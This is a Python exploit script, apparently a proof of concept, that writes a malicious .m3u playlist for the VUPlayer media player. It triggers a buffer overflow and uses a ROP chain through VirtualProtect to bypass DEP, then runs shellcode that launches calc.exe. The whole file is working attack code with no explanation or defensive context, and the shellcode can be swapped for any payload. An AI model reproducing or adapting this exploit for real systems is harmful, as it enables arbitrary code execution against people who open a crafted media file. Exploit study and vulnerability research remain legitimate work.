import sys
import struct
import os

crash_file = "vuplayer-dep.m3u"

#0x1060e25c : kernel32.virtualprotect
#
#GOALS
#EAX 90909090 => Nop                                              
#ECX <writeable pointer> => lpflOldProtect                                
#EDX 00000040 => flNewProtect                                   
#EBX 00000201 => dwSize                                           
#ESP ???????? => Leave as is                                 
#EBP ???????? => Call to ESP (jmp, call, push,..)              
#ESI ???????? => PTR to VirtualProtect - DWORD PTR of 0x1060E25C
#EDI 10101008 => ROP-Nop same as EIP
#

EDX = "\xf8\x74\x60\x10" # XOR EAX,EAX | RETN
EDX += "\x74\x44\x01\x10" # ADD EAX,4 | RETN
EDX += "\x74\x44\x01\x10" # ADD EAX,4 | RETN
EDX += "\x74\x44\x01\x10" # ADD EAX,4 | RETN
EDX += "\x74\x44\x01\x10" # ADD EAX,4 | RETN
EDX += "\x74\x44\x01\x10" # ADD EAX,4 | RETN
EDX += "\x74\x44\x01\x10" # ADD EAX,4 | RETN
EDX += "\x74\x44\x01\x10" # ADD EAX,4 | RETN
EDX += "\x74\x44\x01\x10" # ADD EAX,4 | RETN
EDX += "\x74\x44\x01\x10" # ADD EAX,4 | RETN
EDX += "\x74\x44\x01\x10" # ADD EAX,4 | RETN
EDX += "\x74\x44\x01\x10" # ADD EAX,4 | RETN
EDX += "\x74\x44\x01\x10" # ADD EAX,4 | RETN
EDX += "\x74\x44\x01\x10" # ADD EAX,4 | RETN
EDX += "\x74\x44\x01\x10" # ADD EAX,4 | RETN
EDX += "\x74\x44\x01\x10" # ADD EAX,4 | RETN
EDX += "\x74\x44\x01\x10" # ADD EAX,4 | RETN
EDX += "\x6d\x8a\x03\x10" # XCHG EAX,EDX | RETN

EAX = "\xe7\x5f\x01\x10" #pop eax | retn
EAX += "\x90\x90\x90\x90"

#10104A10   0000             ADD BYTE PTR DS:[EAX],AL
ECX = "\x12\x10\x10\x10"  # POP ECX | RETN
#ropchain += "\x18\x4A\x10\x10"
ECX += "\xDC\x53\x10\x10"

#EBX
EBX = "\xf8\x74\x60\x10" # XOR EAX,EAX | RETN
EBX += "\xe7\x5f\x01\x10" # POP EAX | RETN
EBX += "\xbc\x01\x48\x99"
EBX += "\x74\xa0\x03\x10"# XOR EAX | RETN
EBX += "\x32\x2f\x03\x10" # XCHG EAX,EBX | RETN 0X00

EBP = "\x0c\x80\x60\x10" # POP EBP | RETN 0x0C
#EBP = "\x0d\x7c\x01\x10" # POP EBP | RETN 0x0C
#1010539F   FFE4             JMP ESP
EBP += "\x9F\x53\x10\x10"
EBP += "\x08\x10\x10\x10" # ROP-NOP
EBP += "\x08\x10\x10\x10" # ROP-NOP
EBP += "\x08\x10\x10\x10" # ROP-NOP
EBP += "\x08\x10\x10\x10" # ROP-NOP
EBP += "\x08\x10\x10\x10" # ROP-NOP
#EBP += "\x08\x10\x10\x10" # ROP-NOP


ESI = "\xe7\x5f\x01\x10" # POP EAX | RETN
ESI += "\x5c\xe2\x60\x10"
ESI += "\xf1\xea\x01\x10" # MOV EAX,DWORD PTR DS:[EAX] | RETN
ESI += "\x50\x09\x03\x10" # XCHG EAX,ESI # RETN

#EDI
EDI = "\xb0\x90\x01\x10" # POP EDI| RETN
EDI += "\x08\x10\x10\x10"

# PUSHAD Chunk
PUSHAD = "\xa5\xd7\x01\x10" # PUSHAD | RETN

rop = EDX
rop += ESI
rop += EBX 
rop += EBP
rop += EDI
rop += EAX
rop += ECX
rop += PUSHAD

calc = ("\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64"
"\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B"
"\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20"
"\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07"
"\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74"
"\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7")

nops = "\x90\x90\x90\x90" * 16
fuzz = "A" * 1012
fuzz += "\x08\x10\x10\x10"
fuzz += rop
fuzz += nops
fuzz += calc
fuzz += "C" * (3000 - len(fuzz) - len(rop) - len(nops))

makedafile = open(crash_file, "w")
makedafile.write(fuzz)
makedafile.close()